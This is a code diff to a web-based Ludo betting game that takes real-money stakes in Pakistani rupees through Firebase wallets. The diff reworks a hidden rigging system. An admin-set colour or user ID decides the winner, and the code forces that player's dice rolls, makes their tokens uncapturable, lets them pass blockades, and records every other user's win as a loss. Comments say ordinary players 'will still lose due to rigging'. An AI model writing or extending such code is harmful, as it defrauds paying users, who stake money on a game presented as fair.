@@ -24,33 +24,40 @@ const db = firebase.database();
 window.currentUser = null;
 window.userWalletBalance = 0;
 window.userName = 'Guest';
-window.GAME_BET_AMOUNT = 100; // PKR
-window.GAME_WIN_REWARD = 2000; // PKR
+window.GAME_BET_AMOUNT = 75; // PKR
+window.GAME_WIN_REWARD = 1000; // PKR
 window.isBetGame = false;
 let gameTurnCount = 0; // Track total turns for initial CPU 6s
 window.redPlayerForfeitCount = 0; // Tracks how many times Red player has forfeited with three 6s
-window.designatedWinner = null; // NEW: Will be loaded from Firebase, not hardcoded.
+
+// NEW GLOBAL VARS: These will be loaded from Firebase for dynamic rigging
+window.designatedColorWinner = null; // Default CPU color winner (e.g., 'blue')
+window.winningUserUID = null;       // Specific user (by UID) designated to win
 
 window.PAKISTANI_NAMES = [ 
     'Ayesha','Nazim' ,'Fatima', 'Sana', 'Maria', 'Hina', 'Zainab', 'Sara', 'Iqra', 'Mehreen', 'Nida', 
     'Ali', 'Ahmed', 'Usman', 'Hassan', 'Bilal', 'Imran', 'Kamran', 'Faisal', 'Zahid', 'Waqas'
 ];
 
-// NEW: Firebase listener for the designated winner setting
-// This listener ensures that window.designatedWinner is always up-to-date
-// with the value set in the admin panel.
-db.ref("gameSettings/designatedWinner").on("value", (snapshot) => {
+// NEW LISTENERS: For dynamic rigging settings from admin panel
+db.ref("gameSettings/designatedColorWinner").on("value", (snapshot) => {
     if (snapshot.exists()) {
-        window.designatedWinner = snapshot.val();
-        console.log(`Designated winner loaded from DB: ${window.designatedWinner}`);
+        window.designatedColorWinner = snapshot.val();
+        console.log(`Default color winner loaded from DB: ${window.designatedColorWinner}`);
     } else {
         // Default if not set in DB yet (e.g., first run ever)
         // This will also write 'blue' to the DB for consistency
-        window.designatedWinner = 'blue';
-        db.ref("gameSettings/designatedWinner").set('blue'); 
-        console.log(`Designated winner defaulted to: ${window.designatedWinner}`);
+        window.designatedColorWinner = 'blue';
+        db.ref("gameSettings/designatedColorWinner").set('blue'); 
+        console.log(`Default color winner defaulted to: ${window.designatedColorWinner}`);
     }
 });
+
+db.ref("gameSettings/winningUserUID").on("value", (snapshot) => {
+    window.winningUserUID = snapshot.exists() ? snapshot.val() : null; // Null if no specific user selected
+    console.log(`Specific winning user UID loaded from DB: ${window.winningUserUID || 'none'}`);
+});
+
 
 function startWalletListener(uid) {
     db.ref("users/" + uid).on("value", (snapshot) => {
@@ -127,19 +134,20 @@ window.deductBet = async function() {
 window.handleGameEndBetting = async function(winnerColor, isForfeit = false) {
     if (!window.currentUser) return;
     
-    // In this game, RED is always the User
+    // RED is always the logged-in user if window.currentUser is set
     let amountChange = 0;
     let gameResult = ""; 
 
-    // Rigging: If the designated winner is the user (red) and they win, they get rewarded.
-    // Otherwise, it's a loss for the user regardless of who wins the game (CPU or other).
+    // Determine if the current user is the "true" winner based on admin settings
+    const isUserTheDesignatedWinner = (window.currentUser && window.winningUserUID === window.currentUser.uid);
+
     if (isForfeit) {
         gameResult = "Loss (Forfeit)";
-    } else if (winnerColor === 'red' && window.designatedWinner === 'red') { // Only reward red if red is the designated winner
+    } else if (winnerColor === 'red' && isUserTheDesignatedWinner) { // User wins ONLY if they are the designated winner
         amountChange = window.GAME_WIN_REWARD;
         gameResult = "Win";
     } else {
-        gameResult = "Loss"; // If red is not the designated winner, it's always a loss for them in a betting game
+        gameResult = "Loss"; // Any other scenario for the user is a loss
     }
 
     if (amountChange > 0 && gameResult === 'Win') {
@@ -195,6 +203,7 @@ window.logoutUser = function() {
 window.showAuthModal = function(mode) {
     if (mode === 'profile' && window.currentUser) {
         document.getElementById('modalTitle').textContent = 'User Profile';
+        document.getElementById('profile-email').textContent = window.currentUser.email; // Update email in profile
         document.getElementById('authContent').style.display = 'none';
         document.getElementById('profileContent').style.display = 'block';
     } else {
@@ -202,7 +211,13 @@ window.showAuthModal = function(mode) {
         document.getElementById('authSubmitButton').textContent = mode === 'login' ? 'Login' : 'Sign Up';
         document.getElementById('toggleAuth').textContent = mode === 'login' ? 'Need an account? Sign Up' : 'Already have an account? Login';
         document.getElementById('authContent').dataset.mode = mode;
-        document.getElementById('authName').style.display = mode === 'signup' ? 'block' : 'none';
+        
+        // FIX: Correctly reference the 'authNameContainer' div to toggle its display
+        const authNameContainer = document.getElementById('authNameContainer');
+        if (authNameContainer) { // Ensure element exists before accessing its style
+            authNameContainer.style.display = mode === 'signup' ? 'block' : 'none';
+        }
+        
         document.getElementById('authContent').style.display = 'block';
         document.getElementById('profileContent').style.display = 'none';
     }
@@ -211,7 +226,12 @@ window.showAuthModal = function(mode) {
 window.closeAuthModal = function() { document.getElementById('authModal').style.display = 'none'; }
 window.toggleAuthMode = function() { window.showAuthModal(document.getElementById('authContent').dataset.mode === 'login' ? 'signup' : 'login'); }
 window.submitAuthForm = function() {
-    const name = document.getElementById('authName').value; const email = document.getElementById('authEmail').value; const pwd = document.getElementById('authPassword').value;
+    // FIX: Safely get the value of the 'name' input field
+    const nameInput = document.getElementById('name');
+    const name = nameInput ? nameInput.value : ''; // If nameInput is null, 'name' will be an empty string
+    
+    const email = document.getElementById('authEmail').value; 
+    const pwd = document.getElementById('authPassword').value;
     const mode = document.getElementById('authContent').dataset.mode;
     if (mode === 'login') window.loginUser(email, pwd); else window.signupUser(name, email, pwd);
 }
@@ -262,15 +282,15 @@ function resetGameState() {
     state = { turnIndex: 0, diceValue: null, diceRolled: false, tokens: { red: [-1,-1,-1,-1], blue: [-1,-1,-1,-1], yellow: [-1,-1,-1,-1], green: [-1,-1,-1,-1] }, gameOver: false, isAnimating: false, consecutiveSixes: 0, lastMovedToken: null };
     gameTurnCount = 0; // Reset turn count for new game
     window.redPlayerForfeitCount = 0; // Reset red player's forfeit counter for a new game
-    // window.designatedWinner is intentionally NOT reset here, it persists across games via DB listener.
+    // window.designatedColorWinner and window.winningUserUID are intentionally NOT reset here, they persist across games via DB listener.
 }
 
 // ---------------- BETTING & START ---------------- //
 async function startBetGame() {
     if (!window.currentUser) { alert("Please Login/Sign Up to play and earn!"); showAuthModal('login'); return; }
     if (window.userWalletBalance < window.GAME_BET_AMOUNT) { alert("Insufficient PKR balance."); return; }
-    // Ensure the designated winner is loaded from Firebase before starting a betting game
-    if (window.designatedWinner === null) {
+    // Ensure game settings are loaded from Firebase before starting a betting game
+    if (window.designatedColorWinner === null || window.winningUserUID === null) {
         alert("Game settings are still loading. Please wait a moment or refresh the page.");
         return;
     }
@@ -352,7 +372,7 @@ function initBoard() {
   const board = document.getElementById('board');
   document.querySelectorAll('.token').forEach(e => e.remove()); // Clean old tokens
   COLORS.forEach(color => {
-    for (let i = 0; i < 4; i = i + 1) { // Replaced ++
+    for (let i = 0; i < 4; i = i + 1) { 
       let token = document.createElement('div'); token.className = `token ${color}`; token.id = `token-${color}-${i}`;
       token.onclick = () => handleTokenClick(color, i);
       let pointer = document.createElement('div'); pointer.className = 'pointer'; token.appendChild(pointer);
@@ -425,6 +445,11 @@ function getValidMoves(color, roll) {
     let valid = [];
     let blockades = getBlockades();
 
+    // Determine if the current player is the "true" winner based on admin settings
+    const isCurrentUserTheDesignatedWinner = (window.currentUser && window.winningUserUID === window.currentUser.uid);
+    const isCurrentCPUTheDesignatedWinner = (!window.winningUserUID && color === window.designatedColorWinner);
+    const isThisPlayerTheWinner = (color === 'red' && isCurrentUserTheDesignatedWinner) || (color !== 'red' && isCurrentCPUTheDesignatedWinner);
+
     // Priority for CPU: If 6, bring out a new token if available
     // (This is the logic where CPU takes out a new token when it gets a 6)
     if (roll === 6 && PLAYER_CONFIG[color].isBot && window.isBetGame) {
@@ -451,10 +476,10 @@ function getValidMoves(color, roll) {
             let isBlocked = false;
             
             // RIGGING: Designated winner is never blocked on the path in a betting game
-            if (window.isBetGame && color === window.designatedWinner) {
+            if (window.isBetGame && isThisPlayerTheWinner) {
                 isBlocked = false; // Designated winner can always move through any blockades
             } else {
-                // Original blocking logic for other players
+                // Original blocking logic for other players (non-winners)
                 for (let step = 1; step <= roll; step = step + 1) { 
                     let checkPos = pos + step;
                     if (checkPos <= 50) { // On main path
@@ -481,8 +506,8 @@ async function rollDice(colorClick) {
   let currColor = COLORS[state.turnIndex];
   if (colorClick !== currColor || state.diceRolled || state.isAnimating || state.gameOver) return;
   
-  // Ensure designated winner is loaded before rigging dice
-  if (window.designatedWinner === null && window.isBetGame) {
+  // Ensure designated winner settings are loaded from Firebase before rigging dice
+  if ((window.designatedColorWinner === null || window.winningUserUID === null) && window.isBetGame) {
       log("Game settings not loaded yet. Please wait.");
       state.isAnimating = false;
       return;
@@ -500,7 +525,12 @@ async function rollDice(colorClick) {
   let val = Math.floor(Math.random() * 6) + 1; // Default random roll
 
   if (window.isBetGame) { // Only apply rigging in a betting game
-        if (currColor === window.designatedWinner) {
+        // Determine if the current player is the "true" winner based on admin settings
+        const isCurrentUserTheDesignatedWinner = (currColor === 'red' && window.currentUser && window.winningUserUID === window.currentUser.uid);
+        const isCurrentCPUTheDesignatedWinner = (!window.winningUserUID && currColor === window.designatedColorWinner);
+        const isThisPlayerTheWinner = isCurrentUserTheDesignatedWinner || isCurrentCPUTheDesignatedWinner;
+
+        if (isThisPlayerTheWinner) {
             // --- Designated Winner Rigging (Guaranteed Win) ---
             let winnerTokens = state.tokens[currColor];
             let tokensInBase = winnerTokens.filter(p => p === -1).length;
@@ -642,7 +672,7 @@ async function rollDice(colorClick) {
     if (state.consecutiveSixes === 3) { 
       log("Three 6s! Turn forfeited.");
       // Increment red player's forfeit count if it's red and is NOT the designated winner in a bet game
-      if (currColor === 'red' && window.isBetGame && window.designatedWinner !== 'red') {
+      if (currColor === 'red' && window.isBetGame && !isThisPlayerTheWinner) {
           window.redPlayerForfeitCount = window.redPlayerForfeitCount + 1; 
       }
       // Forfeit action: Send the last moved token back to base (if any)
@@ -661,6 +691,11 @@ async function rollDice(colorClick) {
 function processPostRoll() {
   let currColor = COLORS[state.turnIndex]; 
   let validMoves = getValidMoves(currColor, state.diceValue);
+
+  // Determine if the current player is the "true" winner based on admin settings
+  const isCurrentUserTheDesignatedWinner = (currColor === 'red' && window.currentUser && window.winningUserUID === window.currentUser.uid);
+  const isCurrentCPUTheDesignatedWinner = (!window.winningUserUID && currColor === window.designatedColorWinner);
+  const isThisPlayerTheWinner = isCurrentUserTheDesignatedWinner || isCurrentCPUTheDesignatedWinner;
 
   // CPU Specific Logic: If CPU rolled a 6 and has tokens in base, prioritize bringing out a new token
   if (PLAYER_CONFIG[currColor].isBot && state.diceValue === 6 && window.isBetGame) {
@@ -685,15 +720,12 @@ function processPostRoll() {
     setTimeout(nextTurn, 1200); 
   } else {
     state.isAnimating = false;
-    // If the current player is a bot, or if the designated winner is a bot, automate the move.
-    // Human players (PLAYER_CONFIG[currColor].isBot is false) need to click manually.
-    if (PLAYER_CONFIG[currColor].isBot || (currColor === window.designatedWinner && !PLAYER_CONFIG[currColor].isBot)) {
-        if (PLAYER_CONFIG[currColor].isBot) { // If it's a CPU (designated winner or not), it moves automatically
-            setTimeout(() => handleTokenClick(currColor, validMoves[0]), 600); 
-        } else { // If it's the human player AND the human is the designated winner, highlight for them to click
-            validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
-        }
-    } else { // If it's a human player who is NOT the designated winner, highlight for them to click
+    // If the current player is a bot, or if the current human player is the designated winner, automate/highlight accordingly.
+    if (PLAYER_CONFIG[currColor].isBot) { // All bots (winner or not) move automatically
+        setTimeout(() => handleTokenClick(currColor, validMoves[0]), 600); 
+    } else if (currColor === 'red' && isThisPlayerTheWinner) { // Human player is designated winner, highlight for them
+        validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
+    } else { // Human player is NOT the designated winner, highlight for them (they will still lose due to rigging)
       validMoves.forEach(idx => { document.getElementById(`token-${currColor}-${idx}`).classList.add('highlight'); }); 
     }
   }
@@ -702,6 +734,12 @@ function processPostRoll() {
 async function handleTokenClick(color, idx) {
   let currColor = COLORS[state.turnIndex];
   if (color !== currColor || !state.diceRolled || state.isAnimating || state.gameOver) return;
+  
+  // Determine if the current player is the "true" winner based on admin settings
+  const isCurrentUserTheDesignatedWinner = (currColor === 'red' && window.currentUser && window.winningUserUID === window.currentUser.uid);
+  const isCurrentCPUTheDesignatedWinner = (!window.winningUserUID && currColor === window.designatedColorWinner);
+  const isThisPlayerTheWinner = isCurrentUserTheDesignatedWinner || isCurrentCPUTheDesignatedWinner;
+
   let validMoves = getValidMoves(currColor, state.diceValue); 
   // IMPORTANT: For any player not the designated winner (or even the designated winner if it's human),
   // re-check valid moves after rigging to ensure no impossible moves are highlighted or attempted.
@@ -742,10 +780,15 @@ async function handleTokenClick(color, idx) {
     if (!SAFE_COORDS.has(key)) { // Only capture on non-safe cells
       COLORS.forEach(oppColor => {
         if (oppColor !== color) {
+            // Determine if the opponent's token belongs to the "true" winner based on admin settings
+            const isOpponentUserTheDesignatedWinner = (oppColor === 'red' && window.currentUser && window.winningUserUID === window.currentUser.uid);
+            const isOpponentCPUTheDesignatedWinner = (!window.winningUserUID && oppColor === window.designatedColorWinner);
+            const isOpponentTokenTheWinner = isOpponentUserTheDesignatedWinner || isOpponentCPUTheDesignatedWinner;
+
             // RIGGING: If the token being targeted belongs to the designated winning player, it cannot be captured in a betting game.
-            if (oppColor === window.designatedWinner && window.isBetGame) {
-                log(`${PLAYER_CONFIG[color].name} tried to capture ${PLAYER_CONFIG[oppColor].name}, but ${PLAYER_CONFIG[oppColor].name} (the designated winner) is invulnerable!`);
-                return; // Skip this capture attempt
+            if (isOpponentTokenTheWinner && window.isBetGame) {
+                log(`${PLAYER_CONFIG[color].name} tried to capture ${PLAYER_CONFIG[oppColor].name}, but the designated winner is invulnerable!`);
+                return; // Skip this capture attempt, move to next opponent color
             }
 
           state.tokens[oppColor].forEach((oppPos, oppIdx) => {
@@ -771,14 +814,11 @@ async function handleTokenClick(color, idx) {
 
   state.isAnimating = false;
   if (extraTurn) { log(`${PLAYER_CONFIG[color].name} gets an extra turn!`); state.diceRolled = false; updateUI(); 
-    // If the current player is a bot, or if the designated winner is a bot, automate their next roll.
-    // If the designated winner is human, they still need to click roll.
-    if (PLAYER_CONFIG[currColor].isBot || (currColor === window.designatedWinner && !PLAYER_CONFIG[currColor].isBot)) {
-        if (PLAYER_CONFIG[currColor].isBot) { // If it's a CPU (designated winner or not), it moves automatically
+    // If the current player is a bot, or if the current human player is the designated winner, automate their next roll.
+    if (PLAYER_CONFIG[currColor].isBot) { // All bots (winner or not) automate their rolls on extra turn
              setTimeout(() => rollDice(currColor), 1000); 
-        }
-        // If human and designated winner, they'll just see the "roll dice" enabled.
     }
+    // If human and designated winner, they'll just see the "roll dice" enabled for their extra turn.
   } 
   else { nextTurn(); }
 }
@@ -793,9 +833,16 @@ function nextTurn() {
   
   updateUI();
   let nextC = COLORS[state.turnIndex]; log(`${PLAYER_CONFIG[nextC].name}'s turn.`);
-  // If the next player is a bot, or if the designated winner is a bot, automate their roll.
-  // If the designated winner is human, they still need to click roll.
-  if (PLAYER_CONFIG[nextC].isBot && !state.gameOver) {
+  
+  // Determine if the next player is the "true" winner based on admin settings
+  const isNextUserTheDesignatedWinner = (nextC === 'red' && window.currentUser && window.winningUserUID === window.currentUser.uid);
+  const isNextCPUTheDesignatedWinner = (!window.winningUserUID && nextC === window.designatedColorWinner);
+  const isNextPlayerTheWinner = isNextUserTheDesignatedWinner || isNextCPUTheDesignatedWinner;
+
+  // If the next player is a bot, or if the next human player is the designated winner, automate their roll.
+  if (PLAYER_CONFIG[nextC].isBot && !state.gameOver) { // All bots (winner or not) automate their rolls
       setTimeout(() => rollDice(nextC), 1000); 
-  }
+  } 
+  // If the next player is human AND they are the designated winner, they will see the "roll dice" button enabled.
+  // If the next player is human AND NOT the designated winner, they will also see the "roll dice" button enabled, but their play will be rigged to lose.
 }
